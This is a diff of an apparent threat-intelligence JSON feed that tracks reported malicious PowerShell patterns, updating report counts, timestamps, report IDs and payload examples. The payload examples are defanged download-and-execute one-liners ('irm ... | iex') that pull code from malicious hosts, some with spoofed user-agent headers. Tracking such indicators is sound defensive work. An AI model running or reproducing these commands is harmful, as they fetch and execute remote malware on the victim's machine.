@@ -3,11 +3,9 @@
     "Pattern": "(irm '<URL>')|iex",
     "DistinctPayloadCount": 80,
     "ReportCount": 80,
-    "FirstSeen": "2026-11-20T02:55:20.673000+00:00",
-    "LastSeen": "2026-11-27T02:16:57.951000+00:00",
+    "FirstSeen": "2026-11-20T04:45:29.109000+00:00",
+    "LastSeen": "2026-11-27T02:48:36.713000+00:00",
     "ReportIds": [
-      "cmwodzfal1z0v0omlds2tteaj",
-      "cmwodzv5l1z250omlqi1hs6dh",
       "cmwohx2dv1zej0oml7l27yiez",
       "cmwok2akb20g20omltyjagk4e",
       "cmwonme0d20sn0omlf9mptxyx",
@@ -85,7 +83,9 @@
       "cmwxpfxxr0fi30omlvtp74p8o",
       "cmwxzs7ov0fty0omll0s1pyq1",
       "cmwy06ewh0g780omlgqj6ta51",
-      "cmwycp15s0gqa0omljaybbqdc"
+      "cmwycp15s0gqa0omljaybbqdc",
+      "cmwydhp3r0ha90oml1nct0d5i",
+      "cmwydtqb80hum0oml7etj4oca"
     ],
     "PayloadExamples": [
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/023cf003bfe9c9b9')|iex",
@@ -100,7 +100,6 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/3d49565511570d7b')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/3f4f577a85637ebd')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/46879f03c1d2f22d')|iex",
-      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/4e60a6dcbd4a3cbb')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/5cc0843fafdd1b30')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/615573e32a14a9bc')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/62711f702e838a1c')|iex",
@@ -127,12 +126,12 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ad7ecb0a90af78ea')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/adfd41ca5fde8fbb')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/aff7944081ac3ea9')|iex",
-      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b46abcf84e5ae26d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b8c645092d9aa718')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b8fd8c7cc531af4a')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b9e1b8494cf52e32')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ba4873e5c111ee58')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/bc80cbabe7050d7d')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d8c3e94f491383b9')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/eb7996060e99801d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ef9c80bd652ab34d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ffff876c5cca644d')|iex",
@@ -155,6 +154,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/ki9ao4wpdn/3d32e71b41be6ac2')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/prolivdante1/11e3b89ef6427fe6')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/sw1la1x22k/8100c381816daa56')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/sw1la1x22k/c06143360118595d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/wp/1bc76e55aa259b71')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/wp/5c258d979e8e5608')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/wp/6da752f480b0c5f8')|iex",
@@ -370,9 +370,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 11,
-    "ReportCount": 38,
+    "ReportCount": 41,
     "FirstSeen": "2026-11-20T05:33:38.751000+00:00",
-    "LastSeen": "2026-11-26T20:14:30.408000+00:00",
+    "LastSeen": "2026-11-27T02:43:50.648000+00:00",
     "ReportIds": [
       "cmwojn0hw206k0omlh7hl8vzk",
       "cmwojn1tc206n0omln6obho4m",
@@ -411,7 +411,10 @@
       "cmwx13u170dae0omlmlgsvgxf",
       "cmwxcbz2i0eq80omlzv5b0dii",
       "cmwxtokrh0fqu0omlscdxk3zw",
-      "cmwxzqwn00fsp0omlt2fpw17t"
+      "cmwxzqwn00fsp0omlt2fpw17t",
+      "cmwydml610hi40oml2u7u3v4n",
+      "cmwydmynx0hj60omlvef1h679",
+      "cmwydnli80hkh0oml9je3ct2q"
     ],
     "PayloadExamples": [
       "IRM fozeenyqzeokeeqh[.]sisterleveling[.]com/4d9a40aa-2dcd-4623-8ab8-8b7ec2355fcb/b5e589ce-d56d-4c50-bc8d-502a073548.36 | IEX",
@@ -430,16 +433,17 @@
   {
     "Pattern": "(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})|iex",
     "DistinctPayloadCount": 3,
-    "ReportCount": 6,
+    "ReportCount": 7,
     "FirstSeen": "2026-11-20T05:21:15.774000+00:00",
-    "LastSeen": "2026-11-25T22:54:25.415000+00:00",
+    "LastSeen": "2026-11-27T02:44:25.256000+00:00",
     "ReportIds": [
       "cmwoj72ro1zl70omlyibpchkk",
       "cmwv0sxv609o70nml2djvoj24",
       "cmwv0uysm09pl0nml2qyjtgak",
       "cmwv2wyn60cpr0nmlweo0e7wl",
       "cmwvvs4jb0ftx0nml55lbp5mi",
-      "cmwwq0pjk06lv0oml745rpk3x"
+      "cmwwq0pjk06lv0oml745rpk3x",
+      "cmwydoc7q0hn80omlhpmp4wd9"
     ],
     "PayloadExamples": [
       "(irm 'http://hagosuro[.]lc/dantestraff18/9956ca98593d95f4' -UserAgent 'WUA/bdda1e77b2' -Headers @{'X-WUA'='bdda1e77b2'})|iex",
